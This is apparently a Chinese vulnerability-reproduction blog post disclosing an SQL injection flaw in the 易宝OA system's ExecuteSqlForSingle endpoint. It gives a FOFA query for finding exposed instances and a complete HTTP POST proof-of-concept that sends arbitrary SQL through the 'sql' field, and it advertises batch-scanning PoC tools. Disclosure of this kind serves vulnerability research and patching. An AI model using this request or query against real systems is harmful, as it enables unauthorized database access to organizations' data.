#  易宝OA系统ExecuteSqlForSingle接口存在SQL注入漏洞 附POC   
原创 南风徐来  南风漏洞复现文库   2023-11-27 22:16  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 易宝OA系统简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
顶讯是一家数字化行业解决方案提供商，深耕行业三十余年，依托自主研发平台，聚焦事业单位等行业机构，提供场景化、客户解决方案并实现数字化转型实践，致力为客户打造并提供安全可信赖的数字化产品解决方  
案与专业服务  
。  
  
易宝OA系统是一种专门为企业和机构的日常办公工作提供服务的综合性软件平台，具有信息管理、 流程管理 、知识管理（档案和业务管理）、协同办公等多种功能。  
易宝OA系统ExecuteSqlForSingle接口存在SQL注入漏洞。  
## 2.漏洞描述  
  
顶讯是一家数字化行业解决方案提供商，深耕行业三十余年，依托自主研发平台，聚焦事业单位等行业机构，提供场景化、客户解决方案并实现数字化转型实践，致力为客户打造并提供安全可信赖的数字化产品解决方案与专业服务。作为数字化解决方案等引领者和推动者，多年来，我们着力研究数字化基础设施解决方案、数字化燃气营销客服解决方案、数字化电梯物联网检测平台、数字化智能工厂解决方案和数字化智慧空间学习管理系统五大核心技术，并已取得显著成效。在未来的科技创新发展战略中，公司始终秉承“从客户出发，与客户交融”的理念，积极响应社会信息化战略要求，为客户提供更智慧，更简单，更安全的数字化解决方案，开创可持续发展的信息科技新时代。该公司的易宝OA系统存在SQL注入漏洞。  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
易宝OA系统  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Y1T0D44xFgUXo7tlv7JZuA77Qsj9EthzeHfwZbIPibKxVQqNsufwPTcPsESe93Eteb2OeOoK5AOsQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
易宝OA系统存在SQL注入漏洞  
## 4.fofa查询语句  
  
product="顶讯科技-易宝OA系统"  
## 5.漏洞复现  
  
漏洞链接：http://1127.0.0.1/api/system/ExecuteSqlForSingle  
  
漏洞数据包：  
```
POST /api/system/ExecuteSqlForSingle HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: 127.0.0.1
Content-Length: 100
Content-Type: application/x-www-form-urlencoded

token=zxh&sql=select substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)&strParameters
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Y1T0D44xFgUXo7tlv7JZuAg8Glno1uNQUIZ5libNb9ljD79V9ErhSKlSib5XdHG4ConjzbIMyttx7g/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
关注公众号 南风漏洞复现文库 并回复 漏洞复现85 即可获得该POC工具下载地址：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Y1T0D44xFgUXo7tlv7JZuAfprib43paN9e68bARKNtwOonezDvB4lE7pa2lTXlXricAxNhicxL0gZfw/640?wx_fmt=jpeg&from=appmsg "null")  
  
**本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Y1T0D44xFgUXo7tlv7JZuAgFcT5qylZKadS5qk5Xfs9643wDIwibmZhupPeSof1zWst7c7aryiajTw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Y1T0D44xFgUXo7tlv7JZuA4uMCUMNHsINHiawSOicuJlkmzWrvpudWS6Wtmna3M0Wib805OSZZibKNzQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Y1T0D44xFgUXo7tlv7JZuACahPOHBwzK98ibYR3wiadm3CGlQcRpaibVkmPvLzgwsjB93uvbEblJiahA/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
请自行联系厂商打补丁。  
## 8.往期回顾  
  
[用友NC word.docx接口存在任意文件读取漏洞 附POC](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247484647&idx=1&sn=ebb5271c84d60599929e37bb5ab8f939&chksm=974b89e0a03c00f6d967cbcfb28f3a8aef966fb4770867cdf540579262172deeadfeab0d4ccb&scene=21#wechat_redirect)  
  
  
[亿赛通电子文档安全管理系统UploadFileFromClientServiceForClient接口存在任意文件上传漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247484633&idx=1&sn=564b1d5a595d7361fd8bdc358266e647&chksm=974b89dea03c00c83d2194779fdf96bd3a770825c66316a4ddfdbf1a16869543cd3ccef6fb1f&scene=21#wechat_redirect)  
  
  
  
